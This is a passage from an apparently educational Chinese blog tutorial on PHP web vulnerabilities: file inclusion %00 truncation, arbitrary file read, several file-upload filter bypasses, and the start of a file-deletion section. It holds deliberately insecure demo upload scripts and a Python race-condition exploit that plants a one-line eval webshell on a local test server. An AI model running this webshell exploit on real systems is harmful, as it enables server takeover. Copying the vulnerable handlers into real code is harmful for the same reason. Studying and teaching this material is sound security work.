class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>假如你发现了截断包含漏洞,然后又只能上传某些固定后缀的文件,那可以试下00截断</p><p><code>http://127.0.0.1/truncatedinclude.php?a=aaa.txt%00</code></p><p>多个<code>.</code>和<code>/</code>截断,不受GPC限制,但是在php5.3之后修复</p><h3 id="文件读取-下载"><a href="#文件读取-下载" class="headerlink" title="文件读取(下载)"></a>文件读取(下载)</h3><p>程序在下载文件或者读取显示文件的时候,读取文件的参数直接在请求中传递,后台程序获取到这个文件后直接读取返回,问题在于这个参数是用户可控的,可以直接传入想要的文件路径。</p><p>文件读取或者下载函数:</p><ul><li>file_get_contents</li><li>high_light</li><li>fopen</li><li>readfile</li><li>fread</li><li>…</li></ul><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = file_get_contents($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> $file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://127.0.0.1/fileread.php?file=aaa.txt</code></p><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>如果能把文件上传到管理员或者应用程序不想让你上传的目录,那么就存在文件上传漏洞。</p><p>一般的检测流程:</p><ul><li>客户端javascript校验（一般只校验文件的扩展名）</li><li>服务端校验<ul><li>文件头content-type字段校验（image/gif）</li><li>文件内容头校验（GIF89a）</li><li>目录路经检测（检测跟Path参数相关的内容）</li><li>文件扩展名检测 (检测跟文件 extension 相关的内容)</li><li>后缀名黑名单校验</li><li>后缀名白名单校验</li><li>自定义正则校验</li></ul></li><li>WAF设备校验（根据不同的WAF产品而定）</li></ul><p>利用函数:</p><ul><li>move_uploaded_file</li></ul><h3 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h3><p>jsupload.php (test on php 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//文件上传漏洞演示脚本之js验证</span></span><br><span class="line">$uploaddir = <span class="string">'uploads/'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($uploaddir)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upfile'</span>][<span class="string">'tmp_name'</span>], $uploaddir . <span class="string">'/'</span> . $_FILES[<span class="string">'upfile'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'文件上传成功，保存于：'</span> . $uploaddir . $_FILES[<span class="string">'upfile'</span>][<span class="string">'name'</span>] . <span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>($uploaddir . <span class="string">'文件夹不存在,请手工创建！'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//print_r($_FILES);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html;charset=gbk"</span>/&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"content-language"</span> content=<span class="string">"zh-CN"</span>/&gt;</span><br><span class="line">    &lt;title&gt;文件上传漏洞演示脚本--JS验证实例&lt;/title&gt;</span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> file = document.getElementsByName(<span class="string">'upfile'</span>)[<span class="number">0</span>].value;</span><br><span class="line">            <span class="keyword">if</span> (file == <span class="keyword">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">                alert(<span class="string">"你还没有选择任何文件，不能上传!"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">            <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.jpeg|.png|.gif|.bmp|"</span>;</span><br><span class="line">            <span class="comment">//提取上传文件的类型</span></span><br><span class="line">            <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">            <span class="comment">//alert(ext_name);</span></span><br><span class="line">            <span class="comment">//alert(ext_name + "|");</span></span><br><span class="line">            <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">            <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">                alert(errMsg);</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h3&gt;文件上传漏洞演示脚本--JS验证实例&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span> name=<span class="string">"upload"</span> onsubmit=<span class="string">"return checkFile()"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"204800"</span>/&gt;</span><br><span class="line">    请选择要上传的文件：&lt;input type=<span class="string">"file"</span> name=<span class="string">"upfile"</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"上传"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><code>http://127.0.0.1/jsupload.php</code></p><p>判断方式：<br>在浏览加载文件，但还未点击上传按钮时便弹出对话框，(进一步确定可以通过配置浏览器HTTP代理（没有流量经过代理就可以证明是客户端JavaScript检测））内容如：只允许传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</p><p>绕过方法：<br>将需要上传的恶意代码文件类型改为允许上传的类型，例如将shell.asp改为shell.jpg上传，配置Burp Suite代理进行抓包，然后再将文件名shell.jpg改为shell.asp<br>上传页面，审查元素，修改JavaScript检测函数（具体方法：可以使用firebug之类的插件把它禁掉）</p><h3 id="服务端检测"><a href="#服务端检测" class="headerlink" title="服务端检测"></a>服务端检测</h3><h4 id="MIME类型检测"><a href="#MIME类型检测" class="headerlink" title="MIME类型检测"></a>MIME类型检测</h4><p>MIME的作用：使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>] != <span class="string">"image/jpg"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$uploaddir = <span class="string">'./uploads/'</span>;</span><br><span class="line">$uploadfile = $uploaddir . basename($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $uploadfile))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html;charset=gbk"</span>/&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"content-language"</span> content=<span class="string">"zh-CN"</span>/&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span> name=<span class="string">"upload"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"204800"</span>/&gt;</span><br><span class="line">    请选择要上传的文件：&lt;input type=<span class="string">"file"</span> name=<span class="string">"upfile"</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"上传"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>绕过方法:<br>配置Burp Suite代理进行抓包，将Content-Type修改为image/gif，或者其他允许的类型</p><h4 id="扩展名检测"><a href="#扩展名检测" class="headerlink" title="扩展名检测"></a>扩展名检测</h4><p>黑名单检测:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getExt</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//sunstr - 返回字符串的子串</span></span><br><span class="line">    <span class="comment">//strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</span></span><br><span class="line">    <span class="keyword">return</span> substr($filename,strripos($filename,<span class="string">'.'</span>)+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $black_file = explode(<span class="string">"|"</span>,<span class="string">"php|jsp|asp"</span>);<span class="comment">//允许上传的文件类型组</span></span><br><span class="line">    $new_upload_file_ext = strtolower(getExt($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>])); <span class="comment">//取得被.隔开的最后字符串</span></span><br><span class="line">    <span class="keyword">if</span>(in_array($new_upload_file_ext,$black_file))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件不合法"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $filename = basename($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]).<span class="string">"."</span>.$new_upload_file_ext;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],<span class="string">"uploads/"</span>.$filename))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Upload Success"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html;charset=gbk"</span>/&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"content-language"</span> content=<span class="string">"zh-CN"</span>/&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span> name=<span class="string">"upload"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"204800"</span>/&gt;</span><br><span class="line">    请选择要上传的文件：&lt;input type=<span class="string">"file"</span> name=<span class="string">"upfile"</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"上传"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>apache服务器可能做了配置不会解析特殊扩展名<br>使用其他服务器复现(我使用的nginx),上传php4扩展名绕过黑名单<br><code>http://127.0.0.1/uploads/shell.php4</code></p><p>白名单检测:<br>仅允许指定的文件类型上传，比如仅与需上传jpg | gif | doc等类型的文件，其他全部禁止</p><p>绕过方法：</p><ul><li>文件名大小写绕过<ul><li>用像 AsP，pHp 之类的文件名绕过黑名单检测</li></ul></li><li>名单列表绕过<ul><li>用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类</li></ul></li><li>特殊文件名绕过<ul><li>比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式 在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会被windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性</li></ul></li><li>0x00截断<ul><li>文件名后缀就一个%00字节，可以截断某些函数对文件名的判断。在许多语言函数中处理函数中，处理字符串中(php版本需要小于5.3.4,magic_quotes_gpc=Off)</li></ul></li></ul><h4 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h4><p>文件头检测:</p><ul><li>JPG: FF D8 FF E0 00 10 4A 46 49 46</li><li>GIF: 47 49 46 38 39 61 (GIF89a)</li><li>PNG: 89 50 4E 47<br>绕过方法:<br>添加头对应的文件头伪造</li></ul><p>文件相关信息检测:</p><ul><li>检查图片大小、尺寸等的信息。<br>绕过方法:<br>将代码注入到正常文件中(比如图片马:copy /b 1.jpg+2.php)</li></ul><h4 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h4><p>当文件上传到服务器,先暂时保存,在检查是不是符合条件,如果不符合再删掉。<br>利用思路就是我们用多线程不断上传.php文件,在某个没有被删除的时刻如果访问到了.php文件,就生成一个shell,shell就会存到服务器。</p><p>eg:</p><p>competionupload.php(test on php 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">'submit'</span>])&#123;</span><br><span class="line">    $allowtype = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpg"</span>);</span><br><span class="line">    $size = <span class="number">10000000</span>;</span><br><span class="line">    $path = <span class="string">"./uploads/"</span>;</span><br><span class="line">    $filename = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$path.$filename))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error:can not move"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error:not an upload file！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $newfile = $path.$filename;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"file upload success.file path is: "</span>.$newfile.<span class="string">"\n&lt;br /&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        unlink($newfile);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Upload file error: "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $ext = array_pop(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</span><br><span class="line">    <span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</span><br><span class="line">        unlink($newfile);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error:upload the file type is not allowed，delete the file！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span></span><br><span class="line"></span><br><span class="line">    <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html;charset=gbk"</span>/&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"content-language"</span> content=<span class="string">"zh-CN"</span>/&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span> name=<span class="string">"upload"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"MAX_FILE_SIZE"</span> value=<span class="string">"204800"</span>/&gt;</span><br><span class="line">    请选择要上传的文件：&lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span>/&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"上传"</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">exp_name = <span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits,<span class="number">10</span>))</span><br><span class="line">shell_name = <span class="string">''</span>.join(random.sample(string.ascii_letters + string.digits,<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按照自己的环境修改url</span></span><br><span class="line">upload_url = <span class="string">'http://127.0.0.1/competionupload.php'</span></span><br><span class="line">exp_url = <span class="string">'http://127.0.0.1/uploads/&#123;&#125;.php'</span>.format(exp_name)</span><br><span class="line">shell_url = <span class="string">'http://127.0.0.1/uploads/&#123;&#125;.php'</span>.format(shell_name)</span><br><span class="line"></span><br><span class="line">exp_content = (<span class="string">'&lt;?php fputs(fopen("&#123;&#125;.php", "w"), '</span></span><br><span class="line">               <span class="string">'\'&lt;?php @eval($_POST["qqq"]) ?&gt;\'); ?&gt;'</span>)</span><br><span class="line">exp_content = exp_content.format(shell_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">'[+] upload file...'</span>)</span><br><span class="line">        data = &#123;<span class="string">'submit'</span>:<span class="string">'上传'</span>&#125;</span><br><span class="line">        files = &#123;<span class="string">"file"</span>:(<span class="string">'&#123;&#125;.php'</span>.format(exp_name),exp_content)&#125;</span><br><span class="line">        resp = requests.post(upload_url,files=files,data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">'[+] get shell file...'</span>)</span><br><span class="line">        requests.get(exp_url)</span><br><span class="line">        resp = requests.get(shell_url)</span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">'[*] create &#123;&#125;.php success'</span>.format(shell_name))</span><br><span class="line">            os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    threads = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 线程数也可以自己修改,我这里只是开太多线程本地服务器扛不住</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            t = threading.Thread(target=get,args=())</span><br><span class="line">            threads.append(t)</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">            t = threading.Thread(target=upload,args=())</span><br><span class="line">            threads.append(t)</span><br><span class="line">            t.start()        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">            thread.join()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(str(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>可以参考<a href="http://www.lmxspace.com/2018/06/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Ewriteup/" target="_blank" rel="noopener">上面讲了19种情景的bypass方法</a></p><h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><p>文件删除漏洞出现在有文件管理功能的应用上很多,这些应用一般都有文件上传和读取等功能。漏洞利用原理和文件读取差不多,只是利用函数不一样。一般是因为删除文件的文件名可以用../跳转,或者没有限制当前用户只能删除他该有权限删除的文件。php中这个漏洞函数通常是unlink()</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$basedir = <span class="string">'./uploads/'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) 